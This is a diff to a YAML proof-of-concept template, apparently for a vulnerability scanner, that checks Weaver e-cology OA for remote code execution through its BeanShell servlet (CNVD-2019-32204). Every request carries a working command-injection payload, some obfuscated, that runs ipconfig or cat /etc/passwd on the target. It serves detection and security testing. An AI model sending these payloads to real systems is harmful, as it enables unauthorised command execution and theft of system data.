@@ -1,37 +1,41 @@
-name: poc-yaml-weaver-ecology-rce
+name: poc-yaml-weaver-ecology-rce-cnvd-2019-32204
 groups:
-  win:
+  winpoc1:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
         bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=ipconfig
       expression:
         response.status == 200 && response.body.bcontains(b"Windows IP")
+  winpoc2:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
         bsh.script=\u0065\u0078\u0065\u0063("ipconfig");&bsh.servlet.output=raw
       expression:
         response.status == 200 && response.body.bcontains(b"Windows IP")
+  winpoc3:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
         bsh.script=exec("ipconfig");&bsh.servlet.output=raw
       expression:
         response.status == 200 && response.body.bcontains(b"Windows IP")
-  linux:
+  linuxpoc1:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
         bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=cat /etc/passwd
       expression:
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  linuxpoc2:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
         bsh.script=\u0065\u0078\u0065\u0063("cat /etc/passwd");&bsh.servlet.output=raw
       expression:
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  linuxpoc3:
     - method: POST
       path: /weaver/bsh.servlet.BshServlet
       body:
@@ -40,6 +44,7 @@ groups:
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
 detail:
   author: sakura404x
+  version: 7.0/8.0/8.1/9.0
   links:
-    - https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204
-    - https://www.freebuf.com/vuls/215218.html
+    - https://www.cnblogs.com/KHZ521/p/14017940.html
+    - https://xz.aliyun.com/t/6560
